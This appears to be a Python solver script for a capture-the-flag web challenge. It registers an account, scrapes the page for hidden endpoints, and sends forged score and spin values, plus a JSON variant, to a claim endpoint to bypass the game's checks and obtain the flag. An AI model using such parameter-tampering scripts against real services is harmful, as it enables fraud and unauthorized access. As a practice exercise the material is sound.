import requests, json, sys
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.stderr.reconfigure(encoding='utf-8', errors='replace')

base = 'https://web-random-cheese.tracebash.xyz'

# Create session and get dashboard HTML to look for hidden endpoints
s = requests.Session()
s.post(f'{base}/register', data={'username':'hack007','password':'hack007'})
s.post(f'{base}/login', data={'username':'hack007','password':'hack007'})

# Get dashboard with all JS/CSS
r = s.get(f'{base}/')
html = r.text
# Look for API endpoints, data-* attributes, onclick handlers
import re
# Find all URLs
urls = re.findall(r'["\']([^"\']*(?:api|endpoint|submit|action|claim|spin|register|login|admin|flag|secret)[^"\']*)["\']', html.lower())
print('Interesting URLs:', urls)

# Find data attributes
data_attrs = re.findall(r'data-\w+=["\'][^"\']*["\']', html)
print('Data attrs:', data_attrs[:10])

# Find all form actions
forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\']', html, re.IGNORECASE)
print('Form actions:', forms)

# Try claim with spin count=10 and random score
for spins in ['10', '11', '9', '0']:
    for score in ['85', '100', '999', '-1']:
        r = s.post(f'{base}/claim', data={'score': score, 'spins': spins})
        if 'flag' in r.text.lower() and 'need' not in r.text.lower()[:200]:
            print(f'Bypass with score={score}, spins={spins}')
            print(r.text[:1000])

# Try JSON
r = s.post(f'{base}/claim', data=json.dumps({'score': 85}), headers={'Content-Type': 'application/json'})
print(f'JSON claim: {r.status_code}, has_flag={{"flag" in r.text.lower()}}')
print(r.text[:300])